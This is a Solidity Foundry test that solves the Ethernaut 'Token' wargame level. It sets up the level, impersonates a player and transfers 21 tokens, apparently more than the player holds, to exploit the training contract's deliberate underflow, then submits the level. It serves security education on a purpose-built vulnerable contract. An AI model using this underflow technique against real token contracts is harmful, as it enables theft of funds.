// SDPX-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Token/Token.sol";
import "../src/levels/Token/TokenFactory.sol";
import {Vm} from "forge-std/Vm.sol";

contract TokenTest is DSTest {
    TokenFactory tokenFactory;
    Ethernaut ethernaut;
    address eoa = address(69);
    Vm private constant vm = Vm(HEVM_ADDRESS);

    function setUp() public {
        ethernaut = new Ethernaut();
        tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.deal(eoa, 1 ether);
    }

    function testIsTokenCleared() public {
        vm.startPrank(eoa);
        Token token = Token(ethernaut.createLevelInstance(tokenFactory));

        token.transfer(address(101), 21);

        ethernaut.submitLevelInstance(payable(address(token)));

        vm.stopPrank();
    }
}
